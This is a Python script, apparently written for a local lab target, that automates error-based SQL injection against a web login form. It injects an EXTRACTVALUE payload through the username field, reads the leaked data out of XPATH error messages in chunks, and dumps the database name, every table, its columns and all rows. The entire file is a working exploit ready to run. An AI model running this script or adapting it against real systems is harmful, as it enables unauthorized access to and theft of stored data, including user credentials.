from bs4 import BeautifulSoup
import re
import requests
from tabulate import tabulate

BASE_URL = "http://127.0.0.1:8080"
LOGIN_URL = f"{BASE_URL}/login"

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Referer": LOGIN_URL,
}

def extract_error_text(response_text: str) -> str:
    soup = BeautifulSoup(response_text, "html.parser")
    alert = soup.find("div", class_="alert alert-danger")
    if alert:
        match = re.search(r"XPATH syntax error: '\\(.*?)'", alert.text.strip())
        return match.group(1) if match else ""
    return ""

def send_request(payload: str, start=1, step=31, max_len=310) -> str:
    result = ""
    for idx in range(start, max_len, step):
        data = {
            "username": f"admin' AND EXTRACTVALUE(1, CONCAT(0x5c, SUBSTRING(({payload}), {idx}, {step})))#",
            "password": "a"
        }
        res = requests.post(LOGIN_URL, headers=HEADERS, data=data)
        chunk = extract_error_text(res.text)
        if not chunk:
            break
        result += chunk
    return result

def get_db_name() -> str:
    db_name = send_request("SELECT DATABASE()")
    print(f"\n[+] DATABASE: {db_name}")
    return db_name

def get_tables(db_name: str) -> list[str]:
    raw = send_request(f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db_name}'")
    tables = raw.split(',') if raw else []
    print(f"[+] Tables in `{db_name}`: {tables}")
    return tables

def get_columns(table: str, db_name: str) -> list[str]:
    raw = send_request(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db_name}'")
    columns = raw.split(',') if raw else []
    return columns

def get_data(table: str, columns: list[str]) -> list[list[str]]:
    cols = ",".join(columns)
    raw = send_request(f"SELECT GROUP_CONCAT(CONCAT_WS('|', {cols})) FROM {table}")
    rows = raw.split(',') if raw else []
    return [row.split('|') for row in rows]

def main():
    db_name = get_db_name()
    if not db_name:
        print("[!] Failed to retrieve database name.")
        return

    tables = get_tables(db_name)
    if not tables:
        print("[!] No tables found.")
        return

    for table in tables:
        columns = get_columns(table, db_name)
        if not columns:
            print(f"[!] Failed to get columns for table `{table}`.")
            continue

        rows = get_data(table, columns)

        print(f"\n[+] TABLE: `{table}` ({len(rows)} rows)")
        print(tabulate(rows, headers=columns, tablefmt="grid"))

if __name__ == "__main__":
    main()
